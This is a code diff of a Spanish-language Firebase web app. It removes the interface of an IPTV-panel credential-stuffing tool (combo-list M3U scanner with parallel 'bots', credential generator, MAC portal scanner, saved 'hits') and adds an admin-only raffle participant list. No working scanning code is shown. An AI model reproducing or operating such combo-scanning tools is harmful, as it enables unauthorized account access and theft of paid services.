-            <div class="scan-icon">💥</div>
-            <div class="scan-name">Exploit</div>
-            <div class="scan-desc">Extraer contenido Vulnerable</div>
-          </div>
-          <div class="scan-card" onclick="abrirModal('panel')">
-            <div class="scan-icon">🔍</div>
-            <div class="scan-name">Panel Scanner</div>
-            <div class="scan-desc">Extracción de listas</div>
-          </div>
-          <div class="scan-card" onclick="abrirModal('buscador')">
-            <div class="scan-icon">🔎</div>
-            <div class="scan-name">Buscador Paneles</div>
-            <div class="scan-desc">Buscar URL de panel</div>
-          </div>
-          <div class="scan-card" onclick="abrirModal('combo')">
-            <div class="scan-icon">🧩</div>
-            <div class="scan-name">Combo Maker</div>
-            <div class="scan-desc">Generador de credenciales</div>
-          </div>
-          <div class="scan-card" onclick="abrirModal('mac')">
-            <div class="scan-icon">📱</div>
-            <div class="scan-name">Mac Scanner</div>
-            <div class="scan-desc">Portales Stalker</div>
-          </div>
-        </div>
-      </div>
-
-      <!-- ===== SCANNER PANEL (M3U - MUNRRA COMPLETO) ===== -->
-      <div id="scanner-panel" class="card">
-        <div class="card-title" style="font-family:'Orbitron',monospace;">🔍 M3U Scanner - Multi Combo</div>
-
-        <div class="lang-row">
-          <select id="langSelect" class="lang-pill">
-            <option value="es" selected>🇪🇸 ES</option>
-            <option value="en">🇬🇧 EN</option>
-            <option value="fr">🇫🇷 FR</option>
-          </select>
-        </div>
-
-        <label for="hostInput" id="lblHost">Panel (host con o sin http/https):</label>
-        <input type="text" id="hostInput" placeholder="ej: lista.com:8080" autocomplete="off" style="font-family:'Orbitron',monospace;" />
-
-        <label id="lblCombo">Elige archivo .txt con combos (user:pass):</label>
-        <input type="file" id="comboFile1" accept=".txt" style="margin-bottom:8px" />
-        <input type="file" id="comboFile2" accept=".txt" style="margin-bottom:8px" />
-        <input type="file" id="comboFile3" accept=".txt" />
-
-        <label id="lblComboText">…o pega combos (texto libre):</label>
-        <textarea id="comboText" rows="4" placeholder="Paste any text here; user:pass is automatically detected (one per line or in the middle of a line)." style="font-family:'Orbitron',monospace;"></textarea>
-
-        <label for="concurrencyInput" id="lblConc">Número de conexiones paralelas (bots):</label>
-        <input type="number" id="concurrencyInput" min="1" max="100" value="80" />
-
-        <div class="opts">
-          <div class="cors-row"><label><input type="checkbox" id="useCors" checked /> <span id="lblUseCors">Usar proxy CORS</span></label></div>
-          <div class="cors-row"><label><input type="checkbox" id="soundToggle" checked /> <span id="lblSound">🔔 Sonido al encontrar hit</span></label></div>
-          <div class="cors-row"><label><input type="checkbox" id="autoDownload" checked /> <span id="lblAutoDL">⬇️ Descargar resultados al finalizar</span></label></div>
-        </div>
-
+        <div class="card-title">👥 Lista de Participantes</div>
+        <p class="card-subtitle">Todos los que se han registrado para el sorteo.</p>
         <div class="flex-btns">
-          <button id="startBtn" disabled style="font-family:'Orbitron',monospace;">Iniciar Scan</button>
-          <button id="stopBtn" disabled style="font-family:'Orbitron',monospace;">Detener Scan</button>
-          <button id="saveBtn" disabled style="font-family:'Orbitron',monospace;">Guardar Hits (.txt)</button>
+          <button onclick="exportarParticipantes()" class="btn-small btn-success">📤 Exportar Lista</button>
+          <button onclick="eliminarTodosParticipantes()" class="btn-small btn-danger">🗑️ Eliminar Todos</button>
         </div>
-
-        <!-- BARRA JOB 1 -->
-        <div id="progressContainer">
-          <div class="jobTop">
-            <div id="hitsCount1" class="hitsCount">Hits encontrados: <span class="yellow-hit">0</span></div>
-          </div>
-          <div id="progressBar"><div id="progressBarFill"></div></div>
-          <div id="progressText">Esperando inicio...</div>
-          <div id="currentCombo">Usuario actual: -</div>
+        <div style="overflow-x: auto; margin-top: 12px;">
+          <table style="width: 100%; border-collapse: collapse; font-size: 13px;">
+            <thead>
+              <tr style="background: var(--input-bg);">
+                <th style="padding: 10px; text-align: left;">#</th>
+                <th style="padding: 10px; text-align: left;">Nombre</th>
+                <th style="padding: 10px; text-align: left;">Teléfono</th>
+                <th style="padding: 10px; text-align: left;">Fecha Registro</th>
+                <th style="padding: 10px; text-align: left;">Acciones</th>
+              </tr>
+            </thead>
+            <tbody id="tablaParticipantes">
+              <tr><td colspan="5" style="text-align: center; opacity: 0.5; padding: 20px;">No hay participantes registrados.</td></tr>
+            </tbody>
+          </table>
         </div>
-
-        <!-- BARRA JOB 2 -->
-        <div id="progressContainer2">
-          <div class="jobTop">
-            <div id="hitsCount2" class="hitsCount">Hits encontrados: <span class="yellow-hit">0</span></div>
-          </div>
-          <div id="progressBar"><div id="progressBarFill2"></div></div>
-          <div id="progressText2">Esperando inicio...</div>
-          <div id="currentCombo2">Usuario actual: -</div>
-        </div>
-
-        <!-- BARRA JOB 3 -->
-        <div id="progressContainer3">
-          <div class="jobTop">
-            <div id="hitsCount3" class="hitsCount">Hits encontrados: <span class="yellow-hit">0</span></div>
-          </div>
-          <div id="progressBar"><div id="progressBarFill3"></div></div>
-          <div id="progressText3">Esperando inicio...</div>
-          <div id="currentCombo3">Usuario actual: -</div>
-        </div>
-      </div>
-    </div>
-
-    <!-- ===== BANCO DE HITS ===== -->
-    <div id="p-hits" class="page">
-      <div class="card">
-        <div class="card-title">💾 Banco de Hits</div>
-        <p class="card-subtitle">Todos los hits encontrados. Cada copia cuenta como uso.</p>
-        <div class="flex-btns">
-          <button class="btn-small btn-danger" onclick="limpiarTodosLosHits()">🗑️ Vaciar Banco</button>
-          <button class="btn-small btn-success" onclick="exportarHits()">📤 Exportar Todos</button>
-        </div>
-        <div id="hitsContainer" style="margin-top:12px;"><p style="opacity:0.6;">No hay hits guardados.</p></div>
-      </div>
-    </div>
-
-    <!-- ===== CLIENTES (SOLO ADMIN) ===== -->
-    <div id="p-clientes" class="page">
-      <div class="card">
-        <div class="card-title">👥 Registrar Cliente</div>
-        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 12px;">
-          <input id="cli-nombre" placeholder="Nombre completo">
-          <input id="cli-telefono" placeholder="Teléfono">
-        </div>
-        <input id="cli-email" placeholder="Correo electrónico">
-        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 12px;">
-          <input id="cli-metodos-pago" placeholder="Métodos de pago">
-          <input id="cli-plan" placeholder="Plan (Ej: Premium, Básico)">
-        </div>
-        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 12px;">
-          <div><label style="font-size: 13px; opacity: 0.7;">📅 Último pago</label><input type="date" id="cli-fecha-pago"></div>
-          <div><label style="font-size: 13px; opacity: 0.7;">⏰ Próximo corte</label><input type="date" id="cli-fecha-corte"></div>
-        </div>
-        <div style="display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 12px;">
-          <input id="cli-monto" type="number" placeholder="Monto pagado">
-          <input id="cli-dias" type="number" placeholder="Días de prueba">
-          <input id="cli-estado" placeholder="Estado (Activo/Inactivo)">
-        </div>
-        <textarea id="cli-notas" placeholder="Notas adicionales..." rows="2"></textarea>
-        <button onclick="agregarCliente()">➕ Guardar Cliente</button>
-      </div>
-
-      <div class="card">
-        <div class="card-title">👥 Lista de Clientes</div>
-        <div id="lista-clientes-container" class="clientes-grid"></div>
-      </div>
-    </div>
-
-    <!-- ===== URLs / BLOG DE NOTAS ===== -->
-    <div id="p-urls" class="page">
-      <div class="card">
-        <div class="card-title">🔗 Blog de URLs - Bloc de Notas</div>
-        <p class="card-subtitle">Guarda tus URLs favoritas con notas y accede rápido al escáner.</p>
-        
-        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 12px;">
-          <input id="urlInput" placeholder="URL (ej: http://panel.com:8080)">
-          <input id="urlNotaInput" placeholder="Nota (opcional)">
-        </div>
-        <button onclick="agregarURL()">➕ Guardar URL</button>
-        
-        <div id="urlsContainer" style="margin-top:15px;">
-          <p style="opacity:0.6;">No hay URLs guardadas.</p>
-        </div>
-      </div>
-    </div>
-
-    <!-- ===== ADMIN USERS ===== -->
-    <div id="p-admin-users" class="page">
-      <div class="card">
-        <div class="card-title">👑 Gestión de Usuarios</div>
-        <p class="card-subtitle">Aprobar, bloquear o eliminar usuarios registrados.</p>
-        <div class="flex-btns">
-          <button class="btn-azul" onclick="actualizarListaUsuarios()">🔄 Actualizar Lista</button>
-        </div>
-        <div id="users-list-container"><p style="opacity:0.6;">Cargando usuarios...</p></div>
-      </div>
-    </div>
-
-    <!-- ===== SETTINGS ===== -->
-    <div id="p-settings" class="page">
-      <div class="card">
-        <div class="card-title">⚙️ Ajustes</div>
-        <p class="card-subtitle">Configuración de la aplicación</p>
-        <label>Tema:</label>
-        <select id="themeSelect" onchange="toggleTheme(this.value)">
-          <option value="dark">🌙 Oscuro</option>
-          <option value="light">☀️ Claro</option>
-        </select>
-        <label>Idioma:</label>
-        <select id="langSelectSettings" onchange="cambiarIdioma(this.value)">
-          <option value="es">🇪🇸 Español</option>
-          <option value="en">🇬🇧 Inglés</option>
-          <option value="fr">🇫🇷 Francés</option>
-        </select>
       </div>
     </div>
 
   </div>
 </div>
 
-<!-- ===== PANEL EDITAR CLIENTE ===== -->
-<div class="panel-overlay" id="panel-editar-overlay">
-  <div class="panel-editar">
-    <button class="panel-cerrar" onclick="cerrarPanelEditar()">✕</button>
-    <div class="panel-titulo">✏️ Editar Cliente</div>
-    <div id="panel-editar-contenido">
-      <div class="panel-campo"><label>Nombre completo</label><input id="edit-nombre" placeholder="Nombre"></div>
-      <div class="panel-campo"><label>Teléfono</label><input id="edit-telefono" placeholder="Teléfono"></div>
-      <div class="panel-campo"><label>Correo electrónico</label><input id="edit-email" placeholder="Correo"></div>
-      <div class="panel-campo"><label>Métodos de pago</label><input id="edit-metodos" placeholder="Métodos de pago"></div>
-      <div class="panel-campo"><label>Plan</label><input id="edit-plan" placeholder="Plan"></div>
-      <div class="panel-campo"><label>📅 Último pago</label><input id="edit-fecha-pago" type="date"></div>
-      <div class="panel-campo"><label>⏰ Próximo corte</label><input id="edit-fecha-corte" type="date"></div>
-      <div class="panel-campo"><label>💰 Monto pagado</label><input id="edit-monto" type="number" placeholder="Monto"></div>
-      <div class="panel-campo"><label>🧪 Días de prueba</label><input id="edit-dias" type="number" placeholder="Días"></div>
-      <div class="panel-campo"><label>Estado</label><select id="edit-estado"><option value="Activo">Activo</option><option value="Inactivo">Inactivo</option></select></div>
-      <div class="panel-campo"><label>Notas adicionales</label><textarea id="edit-notas" rows="2" placeholder="Notas"></textarea></div>
-      <div class="panel-botones">
-        <button class="btn-success" onclick="guardarEdicionCliente()">💾 Guardar</button>
-        <button class="btn-danger" onclick="cerrarPanelEditar()">❌ Cancelar</button>
-      </div>
-    </div>
-  </div>
-</div>
-
-<!-- ===== MODAL PARA FUNCIONES ===== -->
-<div class="modal-overlay" id="modalOverlay">
-  <div class="modal-content">
-    <button class="modal-close" onclick="cerrarModal()">✕</button>
-    <div class="modal-title" id="modalTitle">Título</div>
-    <div id="modalBody">
-      <p>Cargando...</p>
-    </div>
-  </div>
-</div>
-
-<!-- ===== MODAL PARA REGISTRO EN SORTEO ===== -->
+<!-- ===== MODAL REGISTRO SORTEO (PÚBLICO) ===== -->
 <div class="modal-overlay" id="modalRegistroSorteo">
   <div class="modal-content">
     <button class="modal-close" onclick="cerrarModalRegistroSorteo()">✕</button>
-    <div class="modal-title">🎯 Anotarme para el Sorteo</div>
+    <div class="modal-title">🎯 Regístrate para el Sorteo</div>
     <div id="modalRegistroBody">
-      <p style="margin-bottom: 15px; opacity: 0.7;">Ingresa tus datos para participar en el sorteo del loco Andy 🦁</p>
+      <p style="margin-bottom: 15px; opacity: 0.7;">Ingresa tus datos para participar en el sorteo del Loco Andy 🦁</p>
       <input id="registroSorteoNombre" placeholder="Tu nombre completo" style="margin-bottom: 10px;">
       <input id="registroSorteoTelefono" placeholder="Número de móvil" type="tel">
       <button onclick="registrarParticipanteSorteo()" class="btn-success" style="margin-top: 15px; font-size: 1.1rem; font-weight: 800;">
         🎯 ¡QUIERO PARTICIPAR!
       </button>
       <div id="registroSorteoMensaje" style="margin-top: 15px; font-size: 0.95rem; font-weight: 700;"></div>
+      
+      <!-- Mensaje de éxito (se muestra después de registrar) -->
+      <div id="registroExitoso" style="display: none;" class="registro-exitoso">
+        <div class="icono">🎉</div>
+        <div class="mensaje">✅ ¡Listo! Estás participando en el sorteo del Loco Andy 🦁</div>
+        <div class="subtitulo">Te notificaremos si resultas ganador. ¡Buena suerte! 🍀</div>
+      </div>
     </div>
   </div>
 </div>
 
 <!-- ===== MODAL GANADOR ===== -->
 <div class="modal-overlay" id="modalGanador">
-  <div class="modal-content" style="border-color: #fbbf24; text-align: center;">
+  <div class="modal-content" style="border-color: #fbbf24;">
     <button class="modal-close" onclick="cerrarModalGanador()">✕</button>
-    <div class="modal-title" style="font-size: 2rem; background: linear-gradient(135deg, #fbbf24, #f59e0b); -webkit-background-clip: text; -webkit-text-fill-color: transparent;">🏆 ¡GANADOR!</🏆></div>
-    <div id="ganadorBody" style="padding: 20px 0;">
-      <div style="font-size: 4rem; margin-bottom: 10px;">🎉</div>
-      <div id="ganadorNombre" style="font-size: 2rem; font-weight: 900; color: #fbbf24;">¡FELICIDADES!</div>
-      <div id="ganadorDetalles" style="font-size: 1rem; opacity: 0.8; margin-top: 10px;"></div>
+    <div class="modal-title" style="font-size: 2rem; background: linear-gradient(135deg, #fbbf24, #f59e0b); -webkit-background-clip: text; -webkit-text-fill-color: transparent;">🏆 ¡GANADOR!</div>
+    <div class="ganador-content">
+      <div class="trofeo">🏆</div>
+      <div class="nombre" id="ganadorNombre">¡FELICIDADES!</div>
+      <div class="detalle" id="ganadorDetalles"></div>
       <button onclick="cerrarModalGanador()" class="btn-success" style="margin-top: 20px; font-size: 1.1rem; padding: 12px 40px; width: auto;">🎊 ¡Genial!</button>
     </div>
   </div>
 </div>
 
 <!-- ============================================================ -->
-<!-- FIREBASE + TODAS LAS FUNCIONES + APROBACIÓN EN TIEMPO REAL -->
+<!-- FIREBASE + TODAS LAS FUNCIONES -->
 <!-- ============================================================ -->
 <script type="module">
   import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
-  import { getAuth, createUserWithEmailAndPassword, signInWithEmailAndPassword, onAuthStateChanged, signOut, sendPasswordResetEmail } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-auth.js";
-  import { getFirestore, collection, doc, setDoc, getDoc, getDocs, query, where, updateDoc, deleteDoc, onSnapshot, serverTimestamp, addDoc, writeBatch } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-firestore.js";
+  import { getAuth, signInWithEmailAndPassword, onAuthStateChanged, signOut } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-auth.js";
+  import { getFirestore, collection, doc, getDoc, getDocs, query, where, deleteDoc, onSnapshot, serverTimestamp, addDoc, writeBatch } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-firestore.js";
 
   const firebaseConfig = {
     apiKey: "AIzaSyArnqs6NzzauyMJlx6w3vfUaQqZaithGpM",
@@ -1196,10 +729,9 @@
   window.db = db;
   window.ADMIN_EMAIL = ADMIN_EMAIL;
 
-  let currentUserEmail = null;
   let currentUserIsAdmin = false;
-  let approvalListener = null;
-  let nuevosRegistrosListener = null;
+  let participantesSorteo = [];
+  let ruletaGirando = false;
 
   // ============================================================
   // TOAST
@@ -1231,799 +763,62 @@
   };
 
   // ============================================================
-  // RECUPERAR CONTRASEÑA
+  // MOSTRAR/OCULTAR LOGIN
   // ============================================================
-  let codigoRecuperacion = '';
-  let emailRecuperacion = '';
-
-  window.mostrarRecuperarPass = function() {
-    document.getElementById('loginForm').style.display = 'none';
-    document.getElementById('registerForm').style.display = 'none';
-    document.getElementById('forgotForm').style.display = 'block';
-    document.getElementById('forgotCodeSection').style.display = 'none';
-    document.getElementById('btnEnviarCodigo').style.display = 'block';
-    document.getElementById('btnVerificarCodigo').style.display = 'none';
-    document.getElementById('forgotMessage').textContent = '';
-  };
-
-  window.enviarCodigoRecuperacion = function() {
-    const email = document.getElementById('forgotEmail').value.trim();
-    const msg = document.getElementById('forgotMessage');
-    if (!email) { msg.textContent = '⚠️ Ingresa tu correo electrónico.'; return; }
-
-    codigoRecuperacion = Math.floor(100000 + Math.random() * 900000).toString();
-    emailRecuperacion = email;
-
-    msg.innerHTML = `
-      ✅ Código enviado a <strong>${email}</strong> (simulado)\n
-      📋 <strong style="color:var(--verde-leon); font-size:1.2rem;">Código: ${codigoRecuperacion}</strong>
-    `;
-    document.getElementById('forgotCodeSection').style.display = 'block';
-    document.getElementById('btnEnviarCodigo').style.display = 'none';
-    document.getElementById('btnVerificarCodigo').style.display = 'block';
-
-    alert(`📧 CÓDIGO DE RECUPERACIÓN\n\nTu código es: ${codigoRecuperacion}\n\nIngrésalo en la página para cambiar tu contraseña.`);
-  };
-
-  window.verificarCodigoRecuperacion = async function() {
-    const code = document.getElementById('forgotCode').value.trim();
-    const newPass = document.getElementById('forgotNewPass').value.trim();
-    const newPassConfirm = document.getElementById('forgotNewPassConfirm').value.trim();
-    const msg = document.getElementById('forgotMessage');
-
-    if (!code) { msg.textContent = '⚠️ Ingresa el código de verificación.'; return; }
-    if (code !== codigoRecuperacion) { msg.textContent = '❌ Código incorrecto. Intenta de nuevo.'; return; }
-    if (!newPass || newPass.length < 6) { msg.textContent = '⚠️ La contraseña debe tener al menos 6 caracteres.'; return; }
-    if (newPass !== newPassConfirm) { msg.textContent = '⚠️ Las contraseñas no coinciden.'; return; }
-
-    try {
-      await sendPasswordResetEmail(auth, emailRecuperacion);
-      msg.innerHTML = `
-        ✅ Se ha enviado un enlace de restablecimiento a <strong>${emailRecuperacion}</strong>\n
-        📧 Revisa tu correo (puede estar en spam).
-      `;
-      document.getElementById('forgotCode').value = '';
-      document.getElementById('forgotNewPass').value = '';
-      document.getElementById('forgotNewPassConfirm').value = '';
-      codigoRecuperacion = '';
-      
-      setTimeout(() => {
-        toggleAuthMode('login');
-        document.getElementById('forgotForm').style.display = 'none';
-        document.getElementById('loginForm').style.display = 'block';
-      }, 3000);
-    } catch (err) {
-      msg.textContent = '❌ Error: ' + err.message;
+  window.toggleLogin = function() {
+    const loginCard = document.getElementById('loginCard');
+    if (loginCard.style.display === 'none') {
+      loginCard.style.display = 'block';
+      loginCard.scrollIntoView({ behavior: 'smooth' });
+    } else {
+      loginCard.style.display = 'none';
     }
   };
 
   // ============================================================
-  // LOGIN / REGISTRO
-  // ============================================================
-  window.toggleAuthMode = function(mode) {
-    document.getElementById('loginForm').style.display = mode === 'login' ? 'block' : 'none';
-    document.getElementById('registerForm').style.display = mode === 'register' ? 'block' : 'none';
-    document.getElementById('forgotForm').style.display = 'none';
-    document.getElementById('loginMessage').textContent = '';
-    document.getElementById('forgotMessage').textContent = '';
-    document.getElementById('approvalMessage').classList.remove('show');
-  };
-
-  // ============================================================
-  // ESCUCHAR APROBACIÓN EN TIEMPO REAL
-  // ============================================================
-  function escucharAprobacion(email) {
-    if (!email) return;
-    if (approvalListener) { approvalListener(); approvalListener = null; }
-    
-    const userDocRef = doc(db, "usuarios_permisos", email);
-    approvalListener = onSnapshot(userDocRef, (docSnap) => {
-      if (docSnap.exists()) {
-        const data = docSnap.data();
-        const estado = data.estado;
-        const msgDiv = document.getElementById('approvalMessage');
-        
-        if (estado === true) {
-          msgDiv.className = 'approval-message success show';
-          msgDiv.innerHTML = '✅ ¡Tu cuenta ha sido APROBADA! Ya puedes ingresar.';
-          window.mostrarToast('✅ ¡Cuenta Aprobada!', 'El admin ha aprobado tu cuenta. ¡Ya puedes acceder!');
-          
-          if (auth.currentUser && auth.currentUser.email === email) {
-            setTimeout(() => {
-              document.getElementById('loginContainer').style.display = 'none';
-              document.getElementById('appContainer').style.display = 'block';
-              if (email === ADMIN_EMAIL) {
-                document.getElementById('btnAdminUsers').style.display = 'inline-flex';
-                document.getElementById('btnClientes').style.display = 'inline-flex';
-                document.getElementById('adminSorteoPanel').style.display = 'block';
-                cargarUsuariosPendientes();
-                cargarClientesAdmin();
-                escucharNuevosRegistros();
-                cargarParticipantesSorteo();
-              } else {
-                document.getElementById('btnAdminUsers').style.display = 'none';
-                document.getElementById('btnClientes').style.display = 'none';
-                document.getElementById('adminSorteoPanel').style.display = 'none';
-              }
-              cargarHitsUsuario(email);
-              cargarURLsUsuario(email);
-              actualizarDashboard();
-            }, 1500);
-          }
-        } else if (estado === false) {
-          msgDiv.className = 'approval-message waiting show';
-          msgDiv.innerHTML = '⏳ Tu cuenta está pendiente de aprobación. Espera a que el admin te apruebe.';
-        } else if (estado === 'bloqueado') {
-          msgDiv.className = 'approval-message blocked show';
-          msgDiv.innerHTML = '🚫 Tu cuenta ha sido BLOQUEADA. Contacta al administrador.';
-        }
-      }
-    }, (error) => console.error('Error escuchando aprobación:', error));
-  }
-
-  // ============================================================
-  // ADMIN - ESCUCHAR NUEVOS REGISTROS
-  // ============================================================
-  function escucharNuevosRegistros() {
-    if (nuevosRegistrosListener) { nuevosRegistrosListener(); nuevosRegistrosListener = null; }
-    
-    const q = query(collection(db, "usuarios_permisos"), where("estado", "==", false));
-    nuevosRegistrosListener = onSnapshot(q, (snap) => {
-      if (document.getElementById('p-admin-users').classList.contains('active')) {
-        cargarUsuariosPendientes();
-      }
-      snap.forEach(docSnap => {
-        const data = docSnap.data();
-        if (docSnap.id !== ADMIN_EMAIL) {
-          window.mostrarToast('🔔 Nuevo Registro', `${data.nombre || docSnap.id} se ha registrado. Ve a Usuarios para aprobarlo.`);
-        }
-      });
-    });
-  }
-
-  // ============================================================
-  // LOGIN / REGISTRO
+  // LOGIN (SOLO ADMIN)
   // ============================================================
   window.handleLogin = async function() {
     const email = document.getElementById('loginEmail').value.trim();
     const pass = document.getElementById('loginPass').value.trim();
     const msg = document.getElementById('loginMessage');
-    const approvalMsg = document.getElementById('approvalMessage');
     
     if (!email || !pass) { msg.textContent = '⚠️ Completa todos los campos.'; return; }
 
     try {
-      const userCred = await signInWithEmailAndPassword(auth, email, pass);
-      const userDoc = await getDoc(doc(db, "usuarios_permisos", email));
-      
-      if (!userDoc.exists()) {
-        msg.textContent = '❌ Usuario no registrado.';
-        await signOut(auth);
-        return;
-      }
-      
-      const data = userDoc.data();
-      
-      if (data.estado === false) {
-        msg.textContent = '';
-        approvalMsg.className = 'approval-message waiting show';
-        approvalMsg.innerHTML = '⏳ Tu cuenta está pendiente de aprobación. Espera a que el admin te apruebe.';
-        escucharAprobacion(email);
-        await signOut(auth);
-        return;
-      }
-      
-      if (data.estado === 'bloqueado') {
-        msg.textContent = '🚫 Tu cuenta ha sido bloqueada.';
-        await signOut(auth);
-        return;
-      }
-      
+      await signInWithEmailAndPassword(auth, email, pass);
       msg.textContent = '✅ Inicio de sesión exitoso!';
-      approvalMsg.classList.remove('show');
+      
+      if (email !== ADMIN_EMAIL) {
+        msg.textContent = '❌ Solo el administrador puede acceder.';
+        await signOut(auth);
+        return;
+      }
+      
       document.getElementById('loginContainer').style.display = 'none';
       document.getElementById('appContainer').style.display = 'block';
+      currentUserIsAdmin = true;
       
-      currentUserEmail = email;
-      currentUserIsAdmin = email === ADMIN_EMAIL;
-      
-      if (currentUserIsAdmin) {
-        document.getElementById('btnAdminUsers').style.display = 'inline-flex';
-        document.getElementById('btnClientes').style.display = 'inline-flex';
-        document.getElementById('adminSorteoPanel').style.display = 'block';
-        await cargarUsuariosPendientes();
-        await cargarClientesAdmin();
-        escucharNuevosRegistros();
-        await cargarParticipantesSorteo();
-      } else {
-        document.getElementById('btnAdminUsers').style.display = 'none';
-        document.getElementById('btnClientes').style.display = 'none';
-        document.getElementById('adminSorteoPanel').style.display = 'none';
-      }
-      
-      await cargarHitsUsuario(email);
-      await cargarURLsUsuario(email);
-      actualizarDashboard();
+      await cargarParticipantesSorteo();
       
     } catch (err) {
       msg.textContent = '❌ Error: ' + err.message;
     }
   };
 
-  window.handleRegister = async function() {
-    const email = document.getElementById('registerEmail').value.trim();
-    const pass = document.getElementById('registerPass').value.trim();
-    const name = document.getElementById('registerName').value.trim();
-    const msg = document.getElementById('loginMessage');
-    if (!email || !pass || !name) { msg.textContent = '⚠️ Completa todos los campos.'; return; }
-    if (pass.length < 6) { msg.textContent = '⚠️ La contraseña debe tener al menos 6 caracteres.'; return; }
-
-    try {
-      await createUserWithEmailAndPassword(auth, email, pass);
-      await setDoc(doc(db, "usuarios_permisos", email), {
-        nombre: name, email: email, estado: false, rol: 'seller', fechaRegistro: serverTimestamp()
-      });
-      msg.textContent = '✅ Registro exitoso! Espera a que el admin apruebe tu cuenta.';
-      document.getElementById('registerEmail').value = '';
-      document.getElementById('registerPass').value = '';
-      document.getElementById('registerName').value = '';
-      escucharAprobacion(email);
-      setTimeout(() => toggleAuthMode('login'), 2000);
-    } catch (err) {
-      if (err.code === 'auth/email-already-in-use') {
-        msg.textContent = '❌ Este correo ya está registrado. Intenta iniciar sesión.';
-      } else {
-        msg.textContent = '❌ Error: ' + err.message;
-      }
-    }
-  };
-
   window.handleLogout = async function() {
-    if (approvalListener) { approvalListener(); approvalListener = null; }
-    if (nuevosRegistrosListener) { nuevosRegistrosListener(); nuevosRegistrosListener = null; }
     await signOut(auth);
     document.getElementById('loginContainer').style.display = 'flex';
     document.getElementById('appContainer').style.display = 'none';
+    document.getElementById('loginCard').style.display = 'none';
     document.getElementById('loginMessage').textContent = '';
-    currentUserEmail = null;
     currentUserIsAdmin = false;
-    document.getElementById('approvalMessage').classList.remove('show');
     document.getElementById('toastNotification').classList.remove('show');
   };
 
   // ============================================================
-  // CARGAR USUARIOS (ADMIN)
+  // CARGAR PARTICIPANTES DEL SORTEO
   // ============================================================
-  window.actualizarListaUsuarios = async function() {
-    await cargarUsuariosPendientes();
-  };
-
-  async function cargarUsuariosPendientes() {
-    if (!currentUserIsAdmin) return;
-    const container = document.getElementById('users-list-container');
-    container.innerHTML = '<p style="opacity:0.6;">Cargando usuarios...</p>';
-    try {
-      const q = query(collection(db, "usuarios_permisos"));
-      const querySnap = await getDocs(q);
-      if (querySnap.empty) {
-        container.innerHTML = '<p style="opacity:0.6;">No hay usuarios registrados.</p>';
-        return;
-      }
-      let html = '<div class="table-container"><table><thead><tr><th>Usuario</th><th>Nombre</th><th>Estado</th><th>Rol</th><th>Acciones</th></tr></thead><tbody>';
-      querySnap.forEach(docSnap => {
-        const data = docSnap.data();
-        const email = docSnap.id;
-        const esAdmin = email === ADMIN_EMAIL;
-        let estado = '❓ Desconocido';
-        let estadoClass = '';
-        if (data.estado === true) { estado = '✅ Aprobado'; estadoClass = 'badge-verde'; }
-        else if (data.estado === false) { estado = '⏳ Pendiente'; estadoClass = 'badge-rojo'; }
-        else if (data.estado === 'bloqueado') { estado = '🚫 Bloqueado'; estadoClass = 'badge-muerto'; }
-        const rol = data.rol || 'seller';
-        const bloqueado = data.estado === 'bloqueado';
-        html += `<tr class="${data.estado === true ? 'user-approved' : data.estado === false ? 'user-pending' : 'user-blocked'}">
-          <td><strong>${email}</strong> ${esAdmin ? '👑' : ''}</td>
-          <td>${data.nombre || 'N/A'}</td>
-          <td><span class="badge ${estadoClass}">${estado}</span></td>
-          <td>${rol}</td>
-          <td>
-            ${!esAdmin ? `
-              ${data.estado === false ? `<button class="btn-small btn-success" onclick="aprobarUsuario('${email}')">✅ Aprobar</button>` : ''}
-              ${data.estado === true ? `<button class="btn-small btn-warning" onclick="bloquearUsuario('${email}')">🚫 Bloquear</button>` : ''}
-              ${bloqueado ? `<button class="btn-small btn-success" onclick="desbloquearUsuario('${email}')">🔓 Desbloquear</button>` : ''}
-              <button class="btn-small btn-danger" onclick="eliminarUsuario('${email}')">🗑️ Eliminar</button>
-            ` : '<span style="opacity:0.5;">Admin</span>'}
-          </td>
-        </tr>`;
-      });
-      html += '</tbody></table></div>';
-      container.innerHTML = html;
-    } catch (err) {
-      container.innerHTML = `<p style="color:var(--rojo-leon);">❌ Error: ${err.message}</p>`;
-    }
-  }
-
-  window.aprobarUsuario = async function(email) {
-    if (!confirm(`¿Aprobar a ${email}?`)) return;
-    try { 
-      await updateDoc(doc(db, "usuarios_permisos", email), { estado: true }); 
-      alert('✅ Usuario aprobado');
-      await cargarUsuariosPendientes();
-    } catch (err) { alert('❌ Error: ' + err.message); }
-  };
-
-  window.bloquearUsuario = async function(email) {
-    if (!confirm(`🚫 ¿Bloquear a ${email}?`)) return;
-    try { 
-      await updateDoc(doc(db, "usuarios_permisos", email), { estado: 'bloqueado' }); 
-      alert('🚫 Usuario bloqueado');
-      await cargarUsuariosPendientes();
-    } catch (err) { alert('❌ Error: ' + err.message); }
-  };
-
-  window.desbloquearUsuario = async function(email) {
-    if (!confirm(`🔓 ¿Desbloquear a ${email}?`)) return;
-    try { 
-      await updateDoc(doc(db, "usuarios_permisos", email), { estado: true }); 
-      alert('🔓 Usuario desbloqueado');
-      await cargarUsuariosPendientes();
-    } catch (err) { alert('❌ Error: ' + err.message); }
-  };
-
-  window.eliminarUsuario = async function(email) {
-    if (!confirm(`⚠️ ¿Eliminar permanentemente a ${email}?`)) return;
-    try { 
-      await deleteDoc(doc(db, "usuarios_permisos", email)); 
-      alert('✅ Usuario eliminado');
-      await cargarUsuariosPendientes();
-    } catch (err) { alert('❌ Error: ' + err.message); }
-  };
-
-  // ============================================================
-  // HITS POR USUARIO (FIRESTORE)
-  // ============================================================
-  let hitsUsuario = [];
-
-  window.getHitsDB = function() {
-    return hitsUsuario;
-  };
-
-  async function cargarHitsUsuario(email) {
-    if (!email) return;
-    try {
-      const q = query(collection(db, "usuarios", email, "hits"));
-      const querySnap = await getDocs(q);
-      hitsUsuario = [];
-      querySnap.forEach(docSnap => {
-        hitsUsuario.push({ id: docSnap.id, ...docSnap.data() });
-      });
-      renderBancoHits();
-      actualizarDashboard();
-    } catch (err) {
-      console.error('Error cargando hits:', err);
-    }
-  }
-
-  window.addHitToDB = async function(hitData) {
-    if (!currentUserEmail) return;
